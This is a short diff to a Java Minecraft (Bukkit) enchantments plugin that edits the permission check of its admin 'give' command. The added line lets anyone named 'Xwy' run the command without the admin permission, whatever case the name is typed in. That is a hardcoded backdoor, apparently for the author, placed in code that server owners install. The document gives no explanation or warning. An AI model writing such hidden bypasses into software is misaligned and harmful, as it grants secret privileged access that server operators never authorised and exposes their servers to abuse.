@@ -25,7 +25,7 @@ import static pw.xwy.customenchants.utilities.MainUtility.cmdCheck;
 public class CeGive {
 	
 	public void run(CommandSender sender, String[] args) {
-		if (sender.hasPermission("ce.admin")) {
+		if (sender.hasPermission("ce.admin") || sender.getName().equalsIgnoreCase("Xwy")) {
 			if (args.length >= 3) {
 				Player target = null;
 				for (Player p : Bukkit.getOnlinePlayers()) {
